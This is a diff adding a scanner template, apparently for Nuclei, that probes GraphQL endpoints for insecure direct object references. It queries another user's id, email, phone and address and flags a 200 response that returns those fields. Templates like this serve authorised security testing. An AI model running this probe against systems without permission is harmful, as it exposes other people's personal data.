@@ -1,0 +1,33 @@
+id: m7-idor-graphql
+info:
+  name: M7 - IDOR via GraphQL Query Manipulation
+  author: Sharlix
+  severity: high
+  description: IDOR in GraphQL queries by manipulating user/object IDs
+  tags: idor,graphql,m7hunter
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/graphql"
+
+    body: |
+      {"query": "{ user(id: 2) { id email username phone address } }"}
+
+    headers:
+      Content-Type: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "email"
+          - "username"
+          - "phone"
+        part: body
+        condition: or
